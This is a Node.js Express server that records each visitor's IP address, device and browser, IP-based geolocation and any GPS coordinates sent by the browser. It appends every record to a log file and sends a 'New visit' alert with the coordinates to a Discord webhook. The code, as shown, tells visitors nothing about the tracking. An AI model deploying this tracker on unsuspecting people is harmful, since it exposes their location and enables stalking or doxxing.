const express = require('express');
const UAParser = require('ua-parser-js');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const LOG_FILE = path.join(__dirname, 'visits.jsonl');

function getClientIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) return forwarded.split(',')[0].trim();
  return req.socket.remoteAddress.replace('::ffff:', '');
}

function parseDevice(uaString) {
  const parser = new UAParser(uaString);
  const device = parser.getDevice();
  const os = parser.getOS();
  const browser = parser.getBrowser();

  let category = 'desktop';
  if (device.type === 'mobile') category = os.name === 'iOS' ? 'iphone' : 'android';
  else if (device.type === 'tablet') category = os.name === 'iOS' ? 'ipad' : 'android-tablet';

  return {
    category,
    vendor: device.vendor || null,
    model: device.model || null,
    os: `${os.name || 'unknown'} ${os.version || ''}`.trim(),
    browser: `${browser.name || 'unknown'} ${browser.version || ''}`.trim(),
  };
}

async function getIPLocation(ip) {
  if (!ip || ip === '127.0.0.1' || ip.startsWith('192.168') || ip.startsWith('10.')) {
    return { note: 'local/private IP' };
  }
  try {
    const res = await fetch(`https://ipapi.co/${ip}/json/`);
    if (!res.ok) throw new Error('IP lookup failed');
    const data = await res.json();
    return {
      city: data.city,
      region: data.region,
      country: data.country_name,
      lat: data.latitude,
      lng: data.longitude,
    };
  } catch (err) {
    console.warn('IP geolocation failed:', err.message);
    return null;
  }
}

function appendLog(record) {
  fs.appendFile(LOG_FILE, JSON.stringify(record) + '\n', (err) => {
    if (err) console.error('Failed to write log:', err);
  });
}

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

async function notifyDiscord(record) {
  if (!DISCORD_WEBHOOK_URL) {
    console.warn('DISCORD_WEBHOOK_URL not set — skipping notification');
    return;
  }

  const lines = [
    `📍 **New visit** — ${record.timestamp}`,
    `Device: ${record.device.category} (${record.device.os}, ${record.device.browser})`,
    `IP: ${record.ip}`,
    record.ipLocation
      ? `IP location: ${record.ipLocation.city || '?'}, ${record.ipLocation.country || '?'} (${record.ipLocation.lat}, ${record.ipLocation.lng})`
      : `IP location: unavailable`,
    record.gpsLocation
      ? `GPS location: ${record.gpsLocation.lat}, ${record.gpsLocation.lng} (±${Math.round(record.gpsLocation.accuracy)}m)`
      : `GPS location: not granted`,
  ];

  try {
    const res = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: lines.join('\n') }),
    });
    if (!res.ok) console.error('Discord responded with status', res.status, await res.text());
  } catch (err) {
    console.warn('Discord notify failed:', err.message);
  }
}

app.post('/api/visit', async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const ip = getClientIP(req);
  const device = parseDevice(ua);
  const ipLocation = await getIPLocation(ip);

  const { gpsLat, gpsLng, gpsAccuracy } = req.body || {};
  const gpsLocation = (typeof gpsLat === 'number' && typeof gpsLng === 'number')
    ? { lat: gpsLat, lng: gpsLng, accuracy: gpsAccuracy ?? null }
    : null;

  const record = {
    timestamp: new Date().toISOString(),
    userAgent: ua,
    device,
    ip,
    ipLocation,
    gpsLocation,
  };

  appendLog(record);
  console.log('New visit:', record);
  notifyDiscord(record);

  res.json({ ok: true, received: { device, ipLocation, gpsLocation } });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
